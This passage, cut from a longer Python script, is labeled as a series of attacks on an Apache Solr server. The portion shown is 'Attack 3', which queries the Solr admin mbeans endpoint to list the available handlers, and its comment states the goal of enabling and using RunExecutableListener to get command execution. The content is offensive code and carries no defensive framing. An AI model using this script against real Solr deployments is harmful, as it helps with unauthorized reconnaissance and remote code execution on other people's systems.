    data = req.read().decode()
    print(data[:500])
except Exception as e:
    print(f"Error: {e}")

# Attack 3: Try to enable and use RunExecutableListener
print("\n=== Attack 3: Config API - check available handlers ===")
try:
    url = f"{BASE}/demo/admin/mbeans?cat=QUERY&wt=json"
    req = urllib.request.urlopen(url, timeout=10)
    data = json.loads(req.read().decode())
    # Extract handler names
    solr_mbeans = data.get('solr-mbeans', [])
    for i in range(0, len(solr_mbeans), 2):
        if isinstance(solr_mbeans[i], str):
            print(f"  Category: {solr_mbeans[i]}")
